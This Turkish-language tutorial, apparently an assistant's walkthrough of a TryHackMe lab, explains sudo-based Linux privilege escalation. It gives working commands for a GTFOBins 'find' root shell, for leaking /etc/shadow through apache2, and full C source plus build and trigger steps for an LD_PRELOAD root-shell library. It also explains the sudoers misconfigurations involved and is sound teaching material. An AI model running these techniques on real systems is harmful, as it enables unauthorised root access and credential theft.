### Sudo ve Sudoers Dosyasının Mantığı

Öncelikle temelden başlayalım. `sudo` (superuser do), bir sistem yöneticisinin, normal bir kullanıcıya, normalde sadece `root` kullanıcısının çalıştırabileceği belirli komutları çalıştırma yetkisi vermesini sağlayan bir mekanizmadır. Bu yetkiler `/etc/sudoers` dosyasında tanımlanır.

**Neden böyle bir şeye ihtiyaç var?** Düşün ki bir şirkette Junior SOC Analisti olarak çalışıyorsun (metindeki örnek gibi). Görevin gereği ağ taramaları yapman gerekiyor ve bunun için `nmap` kullanmalısın. Ancak `nmap`'in bazı etkili tarama türleri (örneğin SYN scan `-sS`) root yetkisi gerektirir. Sistem yöneticisi sana tüm sistemi etkileyecek root şifresini vermek yerine, sadece `nmap` komutunu `sudo` ile root olarak çalıştırma yetkisi verebilir.

Bu, "En Az Yetki Prensibi" (Principle of Least Privilege) adı verilen çok önemli bir güvenlik konseptidir. Herkese sadece işini yapması için gereken minimum yetki verilir.

Ancak, bu `sudoers` dosyası yanlış yapılandırılırsa, işte o zaman bizim için bir yetki yükseltme kapısı aralanır.

### Keşif Aşaması: `sudo -l`

Bir saldırgan olarak bir sisteme düşük yetkili bir kullanıcı (örneğimizde `karen`) olarak sızdığımızda atacağımız ilk adımlardan biri şudur:

Bash

```
karen@machine:~$ sudo -l
```

Bu komut, "Ben, `karen` kullanıcısı olarak, hangi komutları `sudo` ile şifresiz veya şifremi girerek çalıştırabilirim?" sorusunun cevabını verir. Çıktı genelde şuna benzer:

```
Matching Defaults entries for karen on machine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User karen may run the following commands on machine:
    (root) /usr/sbin/apache2
    (root) /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less /var/log/syslog
```

Bu çıktı bize paha biçilmez bilgiler verir:

1.  `karen` kullanıcısı `root` olarak `apache2` ve `find` komutlarını çalıştırabilir.
2.  `karen` kullanıcısı, herhangi bir kullanıcı (`ALL`) gibi, şifresiz (`NOPASSWD`) bir şekilde `/usr/bin/less` komutuyla sadece `/var/log/syslog` dosyasını okuyabilir.

Şimdi TryHackMe metnindeki iki ana yöntemi inceleyelim.

* * *

### Yöntem 1: Programların Kendi Fonksiyonlarını Kötüye Kullanmak (GTFOBins Yöntemi)

Bu en yaygın ve etkili yöntemdir. Fikir şudur: Eğer bir programı `root` olarak çalıştırabiliyorsam, o programın "başka bir komut çalıştırma" veya "dosya okuma/yazma" gibi özelliklerini kullanarak sisteme `root` olarak komut verebilirim.

Bunu tek tek ezberlemek yerine, harika bir kaynağımız var: **GTFOBins**.

**GTFOBins Nedir?** https://gtfobins.github.io/ adresi, Unix/Linux sistemlerde bulunan yüzlerce komutun, `sudo` yetkisi, SUID biti gibi özel durumlarda yetki yükseltmek için nasıl kullanılabileceğini listeleyen bir projedir.

**Senaryomuzdaki Uygulaması:**

1.  `sudo -l` çıktısında `/usr/bin/find` komutunu gördük.
    
2.  Hemen GTFOBins sitesine gidip arama kutusuna `find` yazarız.
    
3.  Karşımıza çıkan sayfada "Sudo" bölümünü buluruz. Orada şöyle bir komut görürüz:
    
    Bash
    
    ```
    sudo find . -exec /bin/bash -p \;
    ```
    
    - **`find .`**: Mevcut dizinde bir şeyler bulmaya başla (ne bulduğu önemli değil).
    - **`-exec`**: Bulduğun her şey için bir komut çalıştır.
    - **`/bin/bash -p`**: Çalıştırılacak komut. `-p` parametresi, bash'in yetkileri düşürmeden (etkin kullanıcı kimliği ne ise o olarak) çalışmasını sağlar. `sudo` ile çalıştığı için etkin kimlik `root` olacaktır.
    - **`\;`**: `-exec` komutunun sonlandırıcısı.
    
    Bu komutu terminalde çalıştırdığımızda, `find` komutu aracılığıyla `root` yetkilerinde bir `bash` kabuğu elde ederiz.
    
    Bash
    
    ```
    karen@machine:~$ sudo find . -exec /bin/bash -p \;
    root@machine:~# whoami
    root
    ```
    

**TryHackMe'deki Apache2 Örneği:** Metindeki `apache2` örneği biraz daha dolaylı bir yöntem. Orada doğrudan bir kabuk alamıyoruz ama sistemdeki kritik bir dosyayı, `/etc/shadow` dosyasını okuyabiliyoruz. Bu dosya kullanıcıların parola hash'lerini içerir.

Bash

```
sudo /usr/sbin/apache2 -f /etc/shadow
```

Bu komut Apache'ye "Konfigürasyon dosyası olarak `/etc/shadow`'u kullan" der. Apache bu dosyayı okumaya çalışır, formatı uymadığı için hata verir ama hata mesajında dosyanın ilk satırını (`root` kullanıcısının hash'ini) sızdırır. Bu da bir yetki yükseltme adımıdır.

* * *

### Yöntem 2: `LD_PRELOAD` Ortam Değişkenini Sömürmek

Bu, daha teknik ve güçlü bir yöntemdir ama belirli bir koşulun sağlanmasını gerektirir.

**`LD_PRELOAD` Nedir?** Linux'ta bir program çalıştırıldığında, "dinamik linker" denilen bir mekanizma o programın ihtiyaç duyduğu paylaşımlı kütüphaneleri (`.so` uzantılı dosyalar) bulur ve belleğe yükler. `LD_PRELOAD` bir ortam değişkenidir. Eğer bu değişkene bir kütüphane yolu belirtirseniz, dinamik linker, programın kendi kütüphanelerinden *önce* sizin belirttiğiniz kütüphaneyi yükler.

Kısacası, bir programa kendi kodumuzu enjekte etmenin bir yoludur.

**Saldırı Senaryosu:**

1.  **Koşulu Kontrol Et:** `sudo -l` çıktısında `env_keep` direktifini ararız.
    
    ```
    Matching Defaults entries for karen on machine:
        env_reset, env_keep+=LD_PRELOAD
    ```
    
    Eğer `env_keep+=LD_PRELOAD` satırını görürsek, bu, `sudo` ile bir komut çalıştırdığımızda `LD_PRELOAD` değişkeninin sıfırlanmayacağı ve korunacağı anlamına gelir. Bu, saldırı için yeşil ışıktır!
    
2.  **Zararlı Kütüphaneyi Oluştur:** Metindeki C kodunu bir dosyaya (`shell.c`) kaydedelim. Bu kodun ne yaptığına bakalım:
    
    C
    
    ```
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    
    void _init() {
        unsetenv("LD_PRELOAD"); // Tekrar tetiklenmemesi için kendini temizler.
        setgid(0);             // Grup kimliğini root (0) yap.
        setuid(0);             // Kullanıcı kimliğini root (0) yap.
        system("/bin/bash");   // Bu yeni root kimliğiyle bir bash kabuğu başlat.
    }
    ```
    
    `_init()` fonksiyonu, bir kütüphane yüklendiğinde otomatik olarak çalışan özel bir fonksiyondur. Yani bizim kodumuz, asıl program (örneğin `apache2`) başlamadan hemen önce çalışacak.
    
3.  **Kütüphaneyi Derle:** Bu C kodunu, paylaşımlı bir kütüphane (`.so` dosyası) olacak şekilde derlememiz gerekir.
    
    Bash
    
    ```
    karen@machine:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
    ```
    
    - **`gcc`**: C derleyicisi.
    - **`-fPIC`**: Position-Independent Code. Paylaşımlı kütüphaneler için zorunludur.
    - **`-shared`**: Çıktının paylaşımlı bir kütüphane olacağını belirtir.
    - **`-o shell.so`**: Çıktı dosyasının adı.
    - **`shell.c`**: Kaynak kod dosyamız.
    - **`-nostartfiles`**: Standart başlangıç dosyalarını kullanma, bizim `_init` fonksiyonumuz var.
4.  **Saldırıyı Gerçekleştir:** Şimdi `sudo` ile çalıştırma yetkimiz olan herhangi bir komutu, `LD_PRELOAD` değişkenini bizim zararlı kütüphanemize ayarlayarak çalıştırırız.
    
    Bash
    
    ```
    karen@machine:~$ sudo LD_PRELOAD=/home/karen/shell.so /usr/sbin/apache2
    ```
    
    Bu komut çalıştırıldığı anda:
    
    - `sudo`, `apache2`'yi `root` yetkileriyle başlatır.
    - `env_keep` sayesinde `LD_PRELOAD` değişkeni korunur.
    - Dinamik linker, `apache2`'den önce bizim `shell.so` dosyamızı yükler.
    - `shell.so` içindeki `_init()` fonksiyonu çalışır.
    - `_init()` fonksiyonu yetkileri `root`'a ayarlar ve bir `bash` kabuğu açar.
    - Sonuç: Karşımıza `root` kabuğu çıkar.
    
    Bash
    
    ```
    root@machine:~# id
    uid=0(root) gid=0(root) groups=0(root)
    ```
    

### Özet ve Pratik Senaryo

Hadi adım adım bir senaryo oluşturalım:

1.  **Hedef Sisteme Sızdın:** Kullanıcı `karen`, şifre `Password1` ile SSH bağlantısı yaptın. `ssh karen@<makine_ip>`
    
2.  **İlk Kontrol:** Yetkilerini kontrol et. `karen@machine:~$ sudo -l` *Çıktıda diyelim ki `/usr/bin/find` ve `env_keep+=LD_PRELOAD` ile `/usr/bin/less` gördün.*
    
3.  **Yol 1: Kolay Yol (GTFOBins)**
    
    - `sudo -l` çıktısında `find` gördüğün için GTFOBins'e bak.
    - Oradaki komutu kopyala ve yapıştır: `karen@machine:~$ sudo find . -exec /bin/bash -p \;`
    - Komut isteminin `$`'dan `#`'a döndüğünü ve `whoami` çıktısının `root` olduğunu gör. **Başarılı!**
4.  **Yol 2: Teknik Yol (`LD_PRELOAD`)**
    
    - `sudo -l` çıktısında `env_keep+=LD_PRELOAD` ve `/usr/bin/less` gördün.
    - Bir C dosyası oluştur: `nano shell.c` ve yukarıdaki C kodunu içine yapıştır.
    - Dosyayı derle: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
    - Saldırıyı başlat: `sudo LD_PRELOAD=./shell.so /usr/bin/less`
    - Karşına çıkan `root` kabuğunun keyfini çıkar. **Başarılı!**

### Sana Tavsiyelerim

- **Pratik Yap:** Bu konuyu en iyi öğrenmenin yolu, TryHackMe, Hack The Box gibi platformlardaki makineleri çözmektir. Özellikle Linux Privilege Escalation odalarına odaklan.
- **GTFOBins'i Yer İmlerine Ekle:** Bu site senin en iyi dostun olacak. Bir komut gördüğünde refleks olarak burada aramayı alışkanlık haline getir.
- **Temelleri Anla:** `LD_PRELOAD` gibi bir tekniği sadece ezberleme. Neden çalıştığını, `env_keep`'in ne anlama geldiğini anlamaya çalış. Bu, benzer ama farklı durumlarla karşılaştığında çözüm üretebilmeni sağlar.

&nbsp;

* * *

### `LD_PRELOAD`'u Bir Analoji ile Anlayalım 🧑‍🍳

Bir programı, bir tarifi uygulaması gereken bir **aşçı** olarak düşün. Aşçının tarifi uygulamak için belirli **yardımcılara** (doğrayıcı, karıştırıcı vb.) ihtiyacı vardır. Bu yardımcılar, Linux sistemindeki **paylaşımlı kütüphanelerdir (`.so` dosyaları)**. Aşçı (program) çalışmaya başladığında, işletim sistemi ona standart yardımcılarını (standart kütüphaneleri) verir.

**`LD_PRELOAD` ise, aşçının yanına gizlice kendi yardımcımızı sokmaktır.**

Bu, işletim sistemine verilen bir not gibidir: "**Hey, asıl aşçı işe başlamadan ve kendi yardımcılarını çağırmadan önce, LÜTFEN ilk olarak *benim gönderdiğim şu özel yardımcıyı* işe al.**"

Bizim "özel yardımcımız" (`shell.so` dosyamız), normal bir yardımcı gibi görünür ama ilk görevi mutfağın (sistemin) kontrolünü ele geçirmektir (`/bin/bash` çalıştırmak gibi).

Özetle: **`LD_PRELOAD`, bir programın normal akışını kesip, araya kendi kodumuzu en başta çalıştırmamızı sağlayan bir mekanizmadır.**

* * *

### `sudo`'nun Güvenlik Önlemi: Neden Bu Normalde Çalışmaz? 🛡️

Şimdi `sudo`'yu devreye sokalım. `sudo`, sistemin güvenlik müdürü gibidir. Normal bir kullanıcının (`karen`), geçici olarak yönetici (`root`) şapkası takmasına izin verir.

Güvenlik müdürü (`sudo`) aptal değildir. Normal bir kullanıcının, yönetici şapkasını takarken ortama kendi "casus yardımcılarını" (`LD_PRELOAD` ile) sokmaya çalışabileceğinin farkındadır.

Bu yüzden `sudo`'nun varsayılan davranışı **çok katıdır**: Bir komutu `sudo` ile çalıştırdığında, güvenlik için kullanıcının mevcut **ortam değişkenlerinin (environment variables) çoğunu temizler (`env_reset`)**. `LD_PRELOAD` da bir ortam değişkeni olduğu için, `sudo` onu daha en başta silip atar.

Yani, normal şartlar altında şu komut **İŞE YARAMAZ**:

Bash

```
# BU KOMUT GENELDE ÇALIŞMAZ
sudo LD_PRELOAD=./shell.so /usr/bin/find
```

Çünkü `sudo`, `find` komutunu çalıştırmadan hemen önce `LD_PRELOAD=./shell.so` değişkenini hafızadan siler. Bizim "özel yardımcı" notumuz yırtılıp atılmış olur.

* * *

### Zafiyetin Anahtarı: `env_keep` Nedir? 🔑

İşte tüm saldırının kilit noktası burası. `env_keep`, `sudoers` dosyasında bulunan ve `sudo`'nun varsayılan "her şeyi temizle" davranışına bir **istisna** getiren bir ayardır.

`env_keep` kelime anlamıyla "**ortamı koru**" demektir.

Eğer `sudo -l` komutunun çıktısında şöyle bir satır görüyorsan:

```
Matching Defaults entries for karen on machine:
    env_reset, mail_badpass, secure_path=..., env_keep+=LD_PRELOAD
```

Bu, güvenlik müdürünün (`sudo`) kural defterinde şöyle bir not olduğu anlamına gelir: "**Normalde tüm ortam değişkenlerini temizle, AMA `LD_PRELOAD` değişkenine dokunma, onu koru.**"

İşte bu, sistem yöneticisi tarafından yapılmış kritik bir yapılandırma hatasıdır. Bu hata, bize "casus yardımcımızı" `sudo`'nun güvenlik kontrolünden geçirme imkanı tanır.

* * *

### Adım Adım Saldırı Akışı (Tüm Parçaları Birleştirelim) 💥

1.  **Keşif:** `karen` kullanıcısı olarak `sudo -l` komutunu çalıştırırsın.
2.  **Zafiyeti Teyit Etme:** Çıktıda iki şeyi ararsın:
    - `sudo` ile çalıştırabileceğin herhangi bir komut (örn: `(root) /usr/bin/find`).
    - `env_keep+=LD_PRELOAD` satırı.
    - Bu ikisini de bulduysan, jackpot!
3.  **Silahı Hazırlama:** Kendi "özel yardımcını" yani `shell.c` dosyasını yazarsın. Bu dosyanın içindeki kod, `root` yetkilerini alıp sana bir kabuk (`shell`) vermekle görevlidir.
4.  **Silahı Derleme:** `gcc` ile `shell.c` dosyasını, bir paylaşımlı kütüphane (`shell.so`) haline getirirsin.
5.  **Tetikleme:** Şu sihirli komutu çalıştırırsın: `karen@machine:~$ sudo LD_PRELOAD=./shell.so /usr/bin/find`

Bu komut çalıştığında arka planda olanlar şunlardır:

- `sudo`, `find` komutunu `root` olarak çalıştırmak için hazırlanır.
- `sudo`, kural defterine bakar ve `env_keep+=LD_PRELOAD` ayarını görür. Bu yüzden `LD_PRELOAD=./shell.so` değişkenini **silmez**.
- İşletim sistemi, `find` programını yüklerken `LD_PRELOAD` değişkeninin ayarlı olduğunu görür.
- `find`'ın kendi yardımcılarından önce, bizim `shell.so` kütüphanemizi yükler.
- `shell.so` içindeki `_init()` fonksiyonu, `root` yetkileriyle çalışır, yetkileri kendisine atar ve bir `/bin/bash` kabuğu başlatır.
- Sonuç olarak, `find` programı tam anlamıyla çalışmaya fırsat bulamadan, sen `root` kabuğunu ele geçirmiş olursun.

**Özetle:** `LD_PRELOAD` saldırı mekanizmasıdır, `env_keep` ise `sudo`'nun bu mekanizmayı engellemesini önleyen yapılandırma hatasıdır.

